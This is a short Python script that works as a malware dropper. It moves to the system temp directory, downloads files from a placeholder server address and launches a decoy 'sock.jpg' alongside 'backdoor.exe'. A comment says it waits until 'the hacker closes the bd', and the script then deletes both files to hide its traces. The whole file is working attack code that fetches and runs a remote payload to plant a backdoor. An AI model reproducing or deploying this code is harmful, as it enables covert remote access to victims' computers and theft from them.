#!/usr/bin/env python

import subprocess, os, requests, tempfile


def download(url):
    get_response = requests.get(url)
    file_type = url.split("/")[-1]
    with open(file_type, "wb") as out_file:
        out_file.write(get_response.content)

# Cross platform way
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# Popen to continue the execution
download("server_ip_file_location")
result = subprocess.Popen("sock.jpg", shell=True)

# With call the program will pause and won't do anything till the hacker closes the bd
download("server_ip_file_location")
result = subprocess.call("backdoor.exe", shell=True)

os.remove("sock.jpg")
os.remove("backdoor.exe")